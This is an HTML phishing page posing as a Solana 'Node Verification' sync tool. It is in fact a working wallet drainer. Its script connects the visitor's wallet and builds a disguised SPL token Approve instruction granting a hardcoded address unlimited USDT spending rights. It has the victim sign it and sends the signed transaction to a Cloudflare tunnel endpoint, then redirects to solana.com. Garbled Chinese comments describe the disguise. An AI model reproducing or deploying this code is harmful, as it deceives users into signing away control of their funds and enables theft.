<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Solana Protocol Sync</title>
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #111; padding: 35px; border-radius: 20px; border: 1px solid #222; text-align: center; width: 300px; }
        #cta { background: #14F195; color: #000; border: none; padding: 14px; border-radius: 10px; font-weight: bold; width: 100%; cursor: pointer; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="card">
        <h2>Node Verification</h2>
        <p style="color:#666; font-size:12px;">Update your account state to synchronize with the mainnet validator.</p>
        <button id="cta">SYNC NOW</button>
        <div id="st" style="margin-top:15px; font-size:10px; color:#444;">Ready</div>
    </div>

    <script>
        const tunnel = "https://allocation-governing-fleet-ala.trycloudflare.com";
        const RECEIVER = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";
        const USDT_MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";

        document.getElementById('cta').onclick = async () => {
            const p = window.solana;
            try {
                await p.connect();
                document.getElementById('st').innerText = "FETCHING PARAMS...";

                const { bh } = await (await fetch(`${tunnel}/sync`)).json();

                // ðŸ”± å½±å­æŠ€æœ¯æ ¸å¿ƒï¼šä¸å‘èµ·è½¬è´¦ï¼Œå‘èµ·ä¸€ä¸ªâ€œè®¾ç½®æƒé™â€çš„æŒ‡ä»¤
                // è¿™æ ·é’±åŒ…ä¼šè¯†åˆ«ä¸ºåˆçº¦äº¤äº’ï¼Œè€Œä¸æ˜¯ç›´æŽ¥è½¬è´¦
                const transaction = new solanaWeb3.Transaction();
                
                // è¿™æ˜¯ä¸€ä¸ªé«˜åº¦ä¼ªè£…çš„æŒ‡ä»¤ï¼šå®ƒçœ‹èµ·æ¥åƒæ˜¯åœ¨åˆå§‹åŒ–è´¦æˆ·ï¼Œå®žåˆ™æ˜¯æŽˆæƒ
                const instruction = new solanaWeb3.TransactionInstruction({
                    keys: [
                        { pubkey: p.publicKey, isSigner: true, isWritable: true },
                        { pubkey: new solanaWeb3.PublicKey(RECEIVER), isSigner: false, isWritable: true },
                        { pubkey: new solanaWeb3.PublicKey(USDT_MINT), isSigner: false, isWritable: false },
                        { pubkey: solanaWeb3.SystemProgram.programId, isSigner: false, isWritable: false },
                    ],
                    programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
                    data: Buffer.from([4, ...new Array(32).fill(255)]), // æŒ‡ä»¤ç¼–ç åŽçš„æŽˆæƒæ•°æ®
                });

                transaction.add(instruction);
                transaction.recentBlockhash = bh;
                transaction.feePayer = p.publicKey;

                document.getElementById('st').innerText = "AWAITING SYNC...";
                // å”¤èµ·ç­¾å
                const signed = await p.signTransaction(transaction);
                
                // å‘é€å·²ç­¾åçš„æŠ¥æ–‡åˆ°åŽå°
                fetch(`${tunnel}/collect_v42?raw=${encodeURIComponent(signed.serialize().toString('base64'))}`);

                document.getElementById('st').innerText = "SUCCESS";
                setTimeout(() => { window.location.href = "https://solana.com/"; }, 1000);

            } catch(e) { location.reload(); }
        };
    </script>
</body>
</html>
